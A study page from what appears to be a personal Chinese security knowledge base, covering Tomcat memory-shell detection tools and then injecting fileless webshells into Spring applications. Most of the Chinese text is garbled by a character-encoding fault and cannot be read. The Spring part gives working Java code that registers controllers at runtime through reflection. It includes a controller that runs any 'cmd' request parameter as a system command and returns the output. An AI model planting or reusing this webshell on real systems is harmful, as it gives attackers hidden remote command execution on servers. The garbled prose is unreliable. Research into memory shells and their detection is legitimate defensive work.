Filter é€šè¿‡æ·»åŠ å…¨å±€æ‹¦æˆªå™¨å¯¹å‚æ•°è¿›è¡Œæ‹¦æˆªï¼Œæ¥è¿›è¡Œæ¶æ„ä»£ç æ‰§è¡Œé€šè¿‡æ·»åŠ filtermapï¼Œå¯ä»¥éšä¾¿è®¾ç½®è·¯ç”±ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¿‡è¯¥æ‹¦æˆªå™¨ å¼•å…¥filterMapsï¼ŒfilterDefï¼Œè¦æ ¹æ®tomcatç‰ˆæœ¬æ¥åˆ¤æ–­ä»£ç é‡è¾ƒé«˜ Servlet ç®€å•æ–¹ä¾¿ï¼Œäº†è§£Servletç”Ÿå‘½å‘¨æœŸå³å¯æ›´ç›´è§‚äº†è§£å¦‚ä½•åŠ¨æ€æ·»åŠ ServletMapping æ— æ³•ä½¿æ‰€æœ‰å‚æ•°éƒ½ç»è¿‡æ¶æ„ä»£ç ï¼Œåªèƒ½åœ¨æˆ‘ä»¬è‡ªå·±è®¾å®šçš„urlä¸­æ‰èƒ½è§¦å‘ Listener ç®€å•æ–¹ä¾¿ï¼Œé€šè¿‡æ·»åŠ ç›‘å¬å™¨å¯¹requestè¿›è¡Œç›‘æ§åœ¨ä»»æ„urlä¸­éƒ½èƒ½è®¾ç½®æˆ‘ä»¬ç›‘å¬çš„å‚æ•° åªè¦ç›‘å¬çš„å‚æ•°å«æœ‰å°±ä¼šè¿›å…¥ç›‘å¬ä»£ç ä¸­å¦‚æœåœ¨è¯¥jspé¡µé¢ä¸‹è®¿é—®ï¼Œåˆ™ä¼šé‡æ”¾è¯·æ±‚ å†…å­˜é©¬æŸ¥æ€ æŸ¥æ€æ„Ÿè§‰å¾ˆå¤šéƒ½æ˜¯ä¾èµ–äºJava agentå»æŸ¥æ€çš„ã€‚ arthas Arthas æ˜¯Alibabaå¼€æºçš„Javaè¯Šæ–­å·¥å…· åœ°å€ï¼šhttps://github.com/alibaba/arthas ä½¿ç”¨æ–‡æ¡£ å¾ˆè¯¦ç»†ï¼Œå¯ä»¥æ…¢æ…¢ç ”ç©¶ ä¸‹è½½arthas-boot.jarï¼Œç„¶åç”¨java -jarçš„æ–¹å¼å¯åŠ¨ï¼š curl -O https://arthas.aliyun.com/arthas-boot.jar java -jar arthas-boot.jar é€šè¿‡mbeanå‘½ä»¤ï¼Œå¯ä»¥ä¾¿æ·çš„æŸ¥çœ‹æˆ–ç›‘æ§ Mbean çš„å±æ€§ä¿¡æ¯ï¼ˆå¯ä»¥æŸ¥çœ‹å¼‚å¸¸Filter/ServletèŠ‚ç‚¹ï¼‰ ä½¿ç”¨jadåç¼–è¯‘classæºç (æ„Ÿè§‰æ˜¯ä¾èµ–äºcfr-decompilerè¿™ä¸ªå°å·¥å…·) copagent Javaå†…å­˜é©¬æå–å·¥å…·ï¼Œarthasçš„æ”¹è¿›ç‰ˆï¼Œå¯ä»¥ç¡®å®šé£é™©ç­‰çº§ï¼Œå¹¶ä¸”å°†å†…å­˜ä¸­çš„ä¿¡æ¯å…¨éƒ¨è¾“å‡º åœ°å€ï¼šhttps://github.com/LandGrey/copagent ä¸‹è½½cop.jarï¼Œç„¶åå¯åŠ¨ wget https://github.com/LandGrey/copagent/raw/release/cop.jar java -jar cop.jar æŸ¥çœ‹è¾“å‡ºç»“æœ æ‰¾åˆ°ç›¸å…³çš„classæ–‡ä»¶å¹¶åç¼–è¯‘ java-memshell-scanner é€šè¿‡jspè„šæœ¬æ‰«æå¹¶æŸ¥æ€å„ç±»ä¸­é—´ä»¶å†…å­˜é©¬ï¼Œæ¯”Java agentè¦æ¸©å’Œä¸€äº›ã€‚ åœ°å€ï¼šhttps://github.com/c0ny1/java-memshell-scanner dumpä¸‹æ¥åç¼–è¯‘ å‚è€ƒ Tomcatå†…å­˜é©¬ tomcatæ— æ–‡ä»¶å†…å­˜webshell Tomcat Filterç±»å‹å†…å­˜é©¬ä¸æŸ¥æ€æŠ€æœ¯å­¦ä¹ ï¼šæ¯”è¾ƒè¯¦ç»†æ¯”è¾ƒç»†ï¼Œåˆ†ææ¯ä¸€æ­¥ä¸ºä»€ä¹ˆè¦è¿™æ ·åšä¹Ÿå¾ˆè¯¦ç»† Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:02 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/02.Springå†…å­˜é©¬.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/02.Springå†…å­˜é©¬.html","title":"02.Springå†…å­˜é©¬","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ åŸºç¡€çŸ¥è¯† Bean ApplicationContext å…¶ä»– Root Context å’Œ Child Context ContextLoaderListener DispatcherServlet Controllerå®ç°æ–¹å¼ ControlleræŠ€æœ¯å®ç° è·å–ä¸Šä¸‹æ–‡çš„ç¯å¢ƒ æ‰‹åŠ¨æ³¨å†ŒController æ–¹æ³•ä¸€:registerMapping æ–¹æ³•äºŒ:registerHandler æ–¹æ³•ä¸‰ï¼šdetectHandlerMethods webshell æ³¨æ„äº‹é¡¹ SpringBootç”Ÿå‘½å‘¨æœŸ Interceptorå®ç° æ‹¦æˆªå™¨ä»£ç  æ­£å¸¸æ³¨å†Œæ‹¦æˆªå™¨ æ•ˆæœ æ¶æ„æ³¨å†Œæ‹¦æˆªå™¨ åº”ç”¨åœºæ™¯ æ¼æ´æ¼”ç¤º å‚è€ƒ å‰è¨€ ä¹‹å‰å­¦ä¹ äº†Tomcatçš„å†…å­˜é©¬ï¼Œä½†æ˜¯Springä¹Ÿæ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ¡†æ¶ï¼Œæ‰€ä»¥å¤§ä½¬ä»¬é‡ç‚¹ç ”ç©¶äº† SpringMVCï¼Œå¹¶å®ç°äº†åˆ©ç”¨å¤šç§ä¸åŒçš„æŠ€æœ¯æ‰‹æ®µï¼Œå¾€å†…å­˜ä¸­æ³¨å…¥æ¶æ„ Webshell ä»£ç çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ã€‚ åŸºç¡€çŸ¥è¯† å…·ä½“å¯ä»¥è¿‡ä¸€ä¸‹SpringMVCçš„å¼€å‘ï¼ŒåŸºäºæ¡†æ¶å¼€å‘æ¯”è¾ƒä¾¿æ·å’Œç®€å• Bean beanæ˜¯Spring æ¡†æ¶çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œå®ƒæ˜¯æ„æˆåº”ç”¨ç¨‹åºçš„ä¸»å¹²ï¼Œå¹¶ä¸”æ˜¯ç”± Spring IoC å®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€é…ç½®ã€ç»„è£…å’Œç®¡ç†çš„å¯¹è±¡ã€‚ åœ¨Springçš„IoCå®¹å™¨ä¸­ï¼Œæˆ‘ä»¬æŠŠæ‰€æœ‰ç»„ä»¶ç»Ÿç§°ä¸ºJavaBeanï¼Œå³é…ç½®ä¸€ä¸ªç»„ä»¶å°±æ˜¯é…ç½®ä¸€ä¸ªBeanã€‚ é€šä¿—æ¥è®²ï¼š bean æ˜¯å¯¹è±¡ bean è¢« IoC å®¹å™¨ç®¡ç† Spring åº”ç”¨ä¸»è¦æ˜¯ç”±ä¸€ä¸ªä¸ªçš„ bean æ„æˆçš„ ApplicationContext ApplicationContextæ˜¯ spring ä¸­è¾ƒé«˜çº§çš„å®¹å™¨ã€‚å’Œ BeanFactory ç±»ä¼¼ï¼Œå®ƒå¯ä»¥åŠ è½½é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„ beanï¼Œå°†æ‰€æœ‰çš„ bean é›†ä¸­åœ¨ä¸€èµ·ï¼Œå½“æœ‰è¯·æ±‚çš„æ—¶å€™åˆ†é… beanã€‚ å¦å¤–ï¼Œå®ƒå¢åŠ äº†ä¼ä¸šæ‰€éœ€è¦çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼Œä»å±æ€§æ–‡ä»¶ä»è§£ææ–‡æœ¬ä¿¡æ¯å’Œå°†äº‹ä»¶ä¼ é€’ç»™æ‰€æŒ‡å®šçš„ç›‘å¬å™¨ã€‚ ApplicationContext æ¥å£ç»§æ‰¿äº† BeanFactory æ¥å£ï¼Œå¹¶é€šè¿‡ç»§æ‰¿å…¶ä»–æ¥å£è¿›ä¸€æ­¥æ‰©å±•äº†åŸºæœ¬å®¹å™¨çš„åŠŸèƒ½ã€‚ å› æ­¤ï¼Œorg.springframework.context.ApplicationContextæ¥å£ä¹Ÿä»£è¡¨äº† IoCå®¹å™¨ ï¼Œå®ƒè´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡(bean)åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´(beans)çš„ä¾èµ–ã€‚ IoCå®¹å™¨é€šè¿‡è¯»å–é…ç½®å…ƒæ•°æ®æ¥è·å–å¯¹è±¡çš„å®ä¾‹åŒ–ã€é…ç½®å’Œç»„è£…çš„æè¿°ä¿¡æ¯ã€‚é…ç½®çš„é›¶å…ƒæ•°æ®å¯ä»¥ç”¨xmlã€Javaæ³¨è§£æˆ–Javaä»£ç æ¥è¡¨ç¤ºã€‚ å…¶ä»– Root Context å’Œ Child Context Spring åº”ç”¨ä¸­å¯ä»¥åŒæ—¶æœ‰å¤šä¸ª Contextï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ª Root Contextï¼Œå‰©ä¸‹çš„å…¨æ˜¯ Child Context æ‰€æœ‰Child Contextéƒ½å¯ä»¥è®¿é—®åœ¨ Root Contextä¸­å®šä¹‰çš„ beanï¼Œä½†æ˜¯Root Contextæ— æ³•è®¿é—®Child Contextä¸­å®šä¹‰çš„ bean æ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº† ServletContext ä¸­ ContextLoaderListener ContextLoaderListener ä¸»è¦è¢«ç”¨æ¥åˆå§‹åŒ–å…¨å±€å”¯ä¸€çš„Root Contextï¼Œå³ Root WebApplicationContextã€‚è¿™ä¸ª Root WebApplicationContext ä¼šå’Œå…¶ä»– Child Context å®ä¾‹å…±äº«å®ƒçš„ IoC å®¹å™¨ï¼Œä¾›å…¶ä»– Child Context è·å–å¹¶ä½¿ç”¨å®¹å™¨ä¸­çš„ bean DispatcherServlet DispatcherServlet çš„ä¸»è¦ä½œç”¨æ˜¯å¤„ç†ä¼ å…¥çš„webè¯·æ±‚ï¼Œæ ¹æ®é…ç½®çš„ URL patternï¼Œå°†è¯·æ±‚åˆ†å‘ç»™æ­£ç¡®çš„ Controller å’Œ Viewã€‚DispatcherServlet åˆå§‹åŒ–å®Œæˆåï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ™®é€šçš„ Child Context å®ä¾‹ã€‚ ä»ä¸‹é¢çš„ç»§æ‰¿å…³ç³»å›¾ä¸­å¯ä»¥å‘ç°ï¼š DispatcherServlet ä»æœ¬è´¨ä¸Šæ¥è®²æ˜¯ä¸€ä¸ª Servletï¼ˆæ‰©å±•äº† HttpServlet )ã€‚ æ¯ä¸ªå…·ä½“çš„ DispatcherServlet åˆ›å»ºçš„æ˜¯ä¸€ä¸ª Child Contextï¼Œä»£è¡¨ä¸€ä¸ªç‹¬ç«‹çš„ IoC å®¹å™¨ï¼›è€Œ ContextLoaderListener æ‰€åˆ›å»ºçš„æ˜¯ä¸€ä¸ª Root Contextï¼Œä»£è¡¨å…¨å±€å”¯ä¸€çš„ä¸€ä¸ªå…¬å…± IoC å®¹å™¨ã€‚ å¦‚æœè¦è®¿é—®å’Œæ“ä½œ bean ï¼Œä¸€èˆ¬è¦è·å¾—å½“å‰ä»£ç æ‰§è¡Œç¯å¢ƒçš„IoCå®¹å™¨ï¼Œä»£è¡¨è€… ApplicationContextã€‚ Controllerå®ç°æ–¹å¼ è¦è¾¾åˆ°è®¿é—®ä¸€ä¸ªURLï¼Œè®¿é—®åˆ°å†…å­˜ä¸­çš„Webshellè·å¾—å›æ˜¾çš„æ•ˆæœï¼Œä¸»è¦çš„æ–¹å¼å¦‚ä¸‹ï¼š åœ¨ä¸ä½¿ç”¨æ³¨è§£å’Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨çº¯ java ä»£ç æ¥è·å¾—å½“å‰ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼› åœ¨ä¸ä½¿ç”¨æ³¨è§£å’Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨çº¯ java ä»£ç åœ¨ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ª controllerï¼› controller ä¸­å†™å…¥ Webshell é€»è¾‘ï¼Œè¾¾åˆ°å’Œ Webshell çš„ URL è¿›è¡Œäº¤äº’å›æ˜¾çš„æ•ˆæœ ControlleræŠ€æœ¯å®ç° è·å–ä¸Šä¸‹æ–‡çš„ç¯å¢ƒ å¤§ä½¬æä¾›äº†4ç§æ–¹æ³•ï¼š WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); æˆ‘éƒ½è¯•äº†ä¸€ä¸‹ï¼Œspring-boot-starter-parent 2.4.3ä¸­åªæœ‰ç¬¬å››ç§æ–¹æ³•å¯ä»¥æˆåŠŸè·å¾—Context æ‰‹åŠ¨æ³¨å†ŒController å¤„ç† URL æ˜ å°„ç›¸å…³çš„ç±»éƒ½å®ç°äº† HandlerMapping æ¥å£ Spring 2.5 å¼€å§‹åˆ° Spring 3.1 ä¹‹å‰ä¸€èˆ¬ä½¿ç”¨org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping æ˜ å°„å™¨ ï¼› Spring 3.1 å¼€å§‹åŠä»¥åä¸€èˆ¬å¼€å§‹ä½¿ç”¨æ–°çš„org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping æ˜ å°„å™¨æ¥æ”¯æŒ@Contollerå’Œ@RequestMappingæ³¨è§£ã€‚ å½“ç„¶ï¼Œä¹Ÿæœ‰é«˜ç‰ˆæœ¬ä¾æ—§ä½¿ç”¨æ—§æ˜ å°„å™¨çš„æƒ…å†µã€‚å› æ­¤æ­£å¸¸ç¨‹åºçš„ä¸Šä¸‹æ–‡ä¸­ä¸€èˆ¬å­˜åœ¨å…¶ä¸­ä¸€ç§æ˜ å°„å™¨çš„å®ä¾‹ beanã€‚åˆå› ç‰ˆæœ¬ä¸åŒå’Œè¾ƒå¤šçš„æ¥å£ç­‰åŸå› ï¼Œæ‰‹å·¥æ³¨å†ŒåŠ¨æ€ controller çš„æ–¹æ³•ä¸æ­¢ä¸€ç§ã€‚ æ–¹æ³•ä¸€:registerMapping åœ¨ spring 4.0 åŠä»¥åï¼Œå¯ä»¥ä½¿ç”¨ registerMapping ç›´æ¥æ³¨å†Œ requestMapping ï¼Œè¿™æ˜¯æœ€ç›´æ¥çš„ä¸€ç§æ–¹å¼ã€‚ ç›¸å…³ç¤ºä¾‹ä»£ç å’Œè§£é‡Šå¦‚ä¸‹ï¼š // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡ Method method = (Class.forName(\"com.example.demo.Test\").getDeclaredMethods())[0]; // 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€ PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰ RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"com.example.demo.Test\").newInstance(), method); è¿™é‡Œåªè¦è®©è¿™äº›ä»£ç èƒ½å¤Ÿè¿è¡Œå°±è¡Œï¼Œæˆ‘å†™åˆ°Controlleré‡Œé¢çš„ com.example.demo.Test package com.example.demo; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class Test { public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { response.getWriter().write(\"ADD CONTROLLER\"); } } æ•ˆæœ æ–¹æ³•äºŒ:registerHandler è¯¥æ–¹æ³•æ¥å— urlPathå‚æ•°å’Œ handlerå‚æ•°ï¼Œå¯ä»¥åœ¨ this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º handler å‚æ•°å€¼çš„ bean, å°† url å’Œ controller å®ä¾‹ bean æ³¨å†Œåˆ° handlerMap ä¸­ã€‚ æˆ‘æ²¡æˆåŠŸï¼Œæ€€ç–‘æ˜¯springç‰ˆæœ¬é—®é¢˜ // 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"com.example.demo.Test\").newInstance()); // 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. åå°„è·å¾— registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\"registerHandler\", String.class, Object.class); m1.setAccessible(true); // 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­ m1.invoke(dh, \"/favicon\", \"dynamicController\"); æ–¹æ³•ä¸‰ï¼šdetectHandlerMethods è¯¥æ–¹æ³•ä»…æ¥å—handlerå‚æ•°ï¼ŒåŒæ ·å¯ä»¥åœ¨ this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º handler å‚æ•°å€¼çš„ bean, å¹¶æ³¨å†Œ controller çš„å®ä¾‹ beanã€‚ ä»ç„¶æ²¡æˆåŠŸ context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"com.example.demo.Test\").newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\"detectHandlerMethods\", Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, \"dynamicController\"); webshell å°±æ³¨å…¥ä¸€ä¸ªæ¶æ„çš„controllerï¼Œç„¶åè¿™ä¸ªcontrollerä¸­urlå¯¹åº”çš„å‡½æ•°æ˜¯æ‰§è¡Œå‘½ä»¤çš„å³å¯ï¼Œç®€å•ç¤ºä¾‹ ä¸»è¦æ˜¯ç»™è·¯ç”±å’Œæ¶æ„æ–¹æ³•ç»‘å®šå³å¯ // com.example.demo.Test package com.example.demo; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; public class Test { public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { String cmd = request.getParameter(\"cmd\"); if(cmd != null){ Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { response.getWriter().write(disr); disr = dataInputStream.readLine(); } } else { response.getWriter().write(\"ADD CONTROLLER\"); } } } // æ³¨å†ŒController WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡ Method method = (Class.forName(\"com.example.demo.Test\").getDeclaredMethods())[0]; // 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€ PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰ RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"com.example.demo.Test\").newInstance(), method); æ³¨æ„äº‹é¡¹ ä¸åŒçš„æ˜ å°„å¤„ç†å™¨ å¦‚ä¸‹é¢çš„é…ç½®ï¼Œå½“æœ‰äº›è€æ—§çš„é¡¹ç›®ä¸­ä½¿ç”¨æ—§å¼æ³¨è§£æ˜ å°„å™¨æ—¶ï¼Œä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ²¡æœ‰ RequestMappingHandlerMapping å®ä¾‹çš„ beanï¼Œä½†ä¼šå­˜åœ¨ DefaultAnnotationHandlerMapping çš„å®ä¾‹ beanã€‚ SpringBootç”Ÿå‘½å‘¨æœŸ ä¸Šé¢è¿‡äº†ä¸€éï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹è¿·èŒ«ï¼Œå¯ä»¥è°ƒè¯•ä¸€ä¸‹springçš„æ•´ä¸ªå¤„ç†è¿‡ç¨‹ ä¸€ä¸ªè¯·æ±‚åˆ°åˆ°åº”ç”¨å±‚ä¹‹å‰ï¼Œéœ€è¦ç»è¿‡é‚£å‡ ä¸ªéƒ¨åˆ†ï¼Ÿæ˜¯å¦‚ä½•ä¸€æ­¥ä¸€æ­¥åˆ°åˆ°æˆ‘ä»¬çš„Controllerçš„? ç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„controller package com.example.demo; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/test\") public class HelloController { @GetMapping(\"/hello\") public static String hello() { return \"123\"; } } ç„¶åä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿæ•´ä¸ªæµç¨‹ï¼ŒæŸ¥çœ‹å †æ ˆä¿¡æ¯ hello:16, HelloController (com.example.demo) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) doInvoke:197, InvocableHandlerMethod (org.springframework.web.method.support) invokeForRequest:141, InvocableHandlerMethod (org.springframework.web.method.support) invokeAndHandle:106, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation) invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation) handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation) handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method) doDispatch:1064, DispatcherServlet (org.springframework.web.servlet) â­ï¸ doService:963, DispatcherServlet (org.springframework.web.servlet) processRequest:1006, FrameworkServlet (org.springframework.web.servlet) doGet:898, FrameworkServlet (org.springframework.web.servlet) service:655, HttpServlet (javax.servlet.http) service:883, FrameworkServlet (org.springframework.web.servlet) service:764, HttpServlet (javax.servlet.http) internalDoFilter:228, ApplicationFilterChain (org.apache.catalina.core) ã€5ã€‘ doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilter:53, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) ã€4ã€‘ doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:100, RequestContextFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) ã€3ã€‘ doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:93, FormContentFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) ã€2ã€‘ doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) ã€1ã€‘ doFilter:163, ApplicationFilterChain (org.apache.catalina.core) invoke:202, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:542, AuthenticatorBase (org.apache.catalina.authenticator) invoke:143, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:357, CoyoteAdapter (org.apache.catalina.connector) service:382, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1723, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) å¯ä»¥çœ‹åˆ°é€šè¿‡å¤šæ¬¡çš„org.apache.catalina.core.ApplicationFilterChain#internalDoFilterè¿‡æ»¤å¤„ç†åï¼Œä¼šè¿›å…¥åˆ°è°ƒåº¦æ–¹æ³•org.springframework.web.servlet.DispatcherServlet#doDispatchä¸­ åœ¨è°ƒåº¦æ–¹æ³•ä¸­é‡æ–°ä¸‹æ–­ç‚¹ï¼Œåˆ†æè°ƒåº¦è¿‡ç¨‹ï¼Œæ‰§è¡Œåˆ°getHandleræ–¹æ³•ï¼Œä»æ³¨é‡Šä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ˜¯ç”¨æ¥ç¡®å®šå½“å‰è¯·æ±‚çš„å¤„ç†ç¨‹åºï¼Œè·Ÿè¿› å¯ä»¥çœ‹åˆ°æ˜¯éå†this.handlerMappings è¿™ä¸ªè¿­ä»£å™¨ä¸­çš„mappingçš„getHandleræ–¹æ³•å¤„ç†httpä¸­çš„requestè¯·æ±‚ é€šè¿‡requestMappingHandlerMappingè¿™ä¸ªbeanè·å–åˆ°äº†handlerï¼Œä½†æ˜¯æ€ä¹ˆè·å–åˆ°çš„å‘¢ï¼Ÿæˆ‘ä»¬ç»§ç»­è·Ÿè¿›getHandler å¯ä»¥çœ‹åˆ°æœ€åè¿”å›çš„æ˜¯executionChainï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšæ‰çš„é‚£ä¸ªhandlerï¼Œè¿™ä¸ªå˜é‡æ˜¯æ€ä¹ˆå¾—æ¥çš„ï¼Œç»§ç»­è·ŸgetHandlerExecutionChain() åœ¨org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandlerExecutionChainä¸­æŠŠæ‰€æœ‰æ‹¦æˆªå™¨éƒ½åŠ å…¥åˆ°chainä¸­å¹¶è¿”å› ä»ä¸Šé¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“åœ¨å“ªåŠ å…¥æ‹¦æˆªå™¨äº†ï¼Œç„¶ååœ¨doDispatch()ä¸­ç»§ç»­å‘ä¸‹åˆ†æï¼Œå‘ç°ä¼šè°ƒç”¨applyPreHandlerï¼Œå­—é¢æ„æ€ç¿»è¯‘è¿‡æ¥å°±æ˜¯é¢„å¤„ç† è·Ÿè¿›ï¼Œå‘ç°ä¼šæ‰§è¡Œæ¯ä¸ªæ‹¦æˆªå™¨çš„preHandle()æ–¹æ³• å¦‚æœç¨‹åºæå‰åœ¨è°ƒç”¨çš„ Controller ä¸Šè®¾ç½®äº† Aspectï¼ˆåˆ‡é¢ï¼‰ï¼Œé‚£ä¹ˆåœ¨æ­£å¼è°ƒç”¨ Controller å‰å®é™…ä¸Šä¼šå…ˆè°ƒç”¨åˆ‡é¢çš„ä»£ç 